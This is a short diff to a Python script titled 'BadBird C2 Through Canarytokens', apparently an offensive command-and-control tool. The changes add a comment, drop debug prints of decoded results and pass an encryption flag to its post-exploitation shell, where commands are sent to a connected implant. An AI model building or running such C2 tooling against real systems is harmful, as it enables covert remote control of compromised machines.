@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 
+# I know I need to use classes. I'm just throwing this together for now
+
 # BadBird C2 Through Canarytokens
 # Author: Austin Martin @amartinsec/blog.amartinsec.com
 
@@ -283,11 +285,7 @@ def getResults(lastdictsize):
                     for q in holder:
                         stringbuilder+=q
 
-                    print("Stringbuilder value: " + stringbuilder)
-
                     stringbuilder = base64.b64decode(decrypt(stringbuilder)).decode('utf-8')
-                    print("stringbuilder val after decoding: " + stringbuilder)
-
 
                     decodedlist.append(stringbuilder)
                     # Need to sleep for large requests
@@ -858,7 +856,7 @@ def main():
                     if connected:
                         print("\n")
                         while True:
-                            cmd = postExpShell()
+                            cmd = postExpShell(encrypted)
                             if cmd != "":
                                 taskCommand(cmd)
                                 lastdictsize = getResults(lastdictsize)
